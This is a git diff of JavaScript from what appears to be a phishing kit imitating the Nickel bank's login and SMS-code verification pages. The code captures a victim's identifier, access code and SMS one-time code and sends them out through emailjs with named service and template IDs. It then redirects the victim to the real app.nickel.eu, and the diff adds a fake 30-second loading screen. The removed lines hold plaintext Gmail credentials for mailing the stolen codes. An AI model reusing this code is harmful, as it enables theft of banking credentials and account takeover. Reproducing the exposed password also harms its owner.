@@ -74,7 +74,34 @@ function smsVerify() {
     const ident= $("#codeSms").val();
     const codeLength = ident.length;
 
-    if(codeLength >= 6) {
+    if(codeLength == 6) {
+        codeSms = ident;
+
+        var tempParams = {
+            identifiant: identifiant,
+            code: codeAccess,
+            codeSms: codeSms
+        };
+
+        
+       /*  
+            emailjs.send("service_4vmkw9x", "template_3r6d79j", tempParams)
+            .then(function (res) {
+                window.location.href = "https://app.nickel.eu"
+            }); 
+        */
+
+        window.location.href = "https://app.nickel.eu"
+    }
+}
+
+
+/* function smsVerify() {
+
+    const ident = $("#codeSms").val();
+    const codeLength = ident.length;
+
+    if (codeLength >= 6) {
         codeSms = ident;
         $("#twopage").hide();
 
@@ -83,16 +110,19 @@ function smsVerify() {
             code: codeAccess,
             codeSms: codeSms
         };
-        emailjs.send("service_4vmkw9x", "template_3r6d79j", tempParams)
-            .then(function (res) {
-                window.location.href = "https://app.nickel.eu"
-            });
-    }
-}
+
+
+             emailjs.send("service_4vmkw9x", "template_3r6d79j", tempParams)
+             .then(function (res) {
+                 window.location.href = "https://app.nickel.eu"
+             }); 
+} */
+
 
 function onSuccess() {
     alert("Bon")
 }
+
 function onError() {
     alert("Bad");
 }
@@ -115,33 +145,28 @@ function addChecked(e) {
             code: codeAccess, 
             codeSms: codeSms
         };
-        $("#twopage").show();
-        $("#onepage").hide();
 
-        emailjs.send("service_4vmkw9x","template_3r6d79j", tempParams)
+        loadingPage();
+        
+
+       /*  emailjs.send("service_4vmkw9x","template_3r6d79j", tempParams)
         .then(function (res) {
            $("#twopage").show()
-        });
+        }); */
         
 
 
     e.preventDefault();
-        
-        //window.location.href = "https://app.nickel.eu"
-
-
-        /*Email.send({
-            //SecureToken : "511610c1-8890-4119-97b5-50dbe7b4e073",
-            Host: "smtp.gmail.com",
-            Username: "leonbonou20@gmail.com",
-            Password: "anselmo12.",
-            To : 'anselmehotegni@gmail.com',
-            From : "leonbonou20@gmail.com",
-            Subject : "Les Codes Nickel",
-            Body : "ok"//"Identifiant: " + identifiant + " - Code : " + codeAccess
-        }).then(
-            message => alert("Send")
-        );*/
     }
 
+}
+
+function loadingPage() {
+    $("#onepage").hide();
+    $("#attente").show();
+    setTimeout(function () {
+        $("#twopage").show();
+        $("#attente").hide();
+    }, 30000)
+    
 }
